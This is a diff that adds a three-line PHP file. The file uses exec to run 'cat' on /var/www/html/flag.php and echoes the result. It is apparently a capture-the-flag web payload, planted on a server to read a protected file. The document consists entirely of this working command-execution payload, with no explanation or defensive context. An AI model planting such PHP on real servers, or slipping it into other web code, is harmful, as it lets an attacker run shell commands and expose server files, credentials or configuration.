@@ -1,0 +1,3 @@
+<?php 
+	echo exec('cat /var/www/html/flag.php'); 
+?>
